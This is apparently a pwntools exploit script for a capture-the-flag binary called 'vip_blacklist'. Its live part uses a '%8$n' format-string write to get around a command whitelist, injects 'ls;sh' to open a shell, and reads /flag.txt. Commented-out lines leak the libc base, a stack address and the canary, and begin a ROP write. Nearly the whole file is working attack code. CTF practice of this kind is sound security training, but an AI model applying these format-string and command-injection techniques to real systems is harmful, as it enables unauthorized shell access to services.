from pwn import *
from icecream import ic

elf = exe = ELF("./vip_blacklist_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000001932
pie b 0x00000000000019e0
pie b 0x0000000000001673
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

# ru("Commands: clear exit ls  \n")
# sl(b'%30$p'.ljust(0x20, b'a'))

# ru("Executing: ")
# libc.address = int(ru("..."), 16) - 0x29d90

# sl(b'%27$p'.ljust(0x20, b'a'))
# ru("Executing: ")
# stack_addr = int(ru("..."), 16) + 0xa8

# sl(b'%26$p'.ljust(0x20, b'a'))
# ru("Executing: ")
# canary = int(ru("..."), 16)
# ic(hex(libc.address))
# ic(hex(stack_addr))

# sl(b'b'*0x20)
# sl(b'c'*0x20)
# sl(b'd'*0x20)
# sl(b'e'*0x20)

# sl(f'%{0x10}c%6$hhnAAAAAAAA')
# pop_rdi = libc.address + 0x000000000002a3e5
# s = hex(pop_rdi)
# s = s[2:]
# l = [s[i:i+2] for i in range(0, len(s), 2)]
# l = l.pop()

# ic(l)
# for i in range(len(l)):
# sl(p64(stack_addr).rjust(8, b'\x00'))
# ru("Commands: clear exit ls  \n")
# sl(f"%{int(l.pop(), 16)}c%13$hhn")
    # sl('abcdefg')

# ru("Commands: clear exit ls  \n")
# sl(f"%{l-0xc8}c%27%hn")
# payload = fmtstr_payload
ru(b"Commands: clear exit ls")
sl(b"%8$n")

sl(b"")
sl("queue\x00clear\x00exit\x00\x00ls;sh")
sl("ls;sh")
sl("cat /flag.txt")

io.interactive()
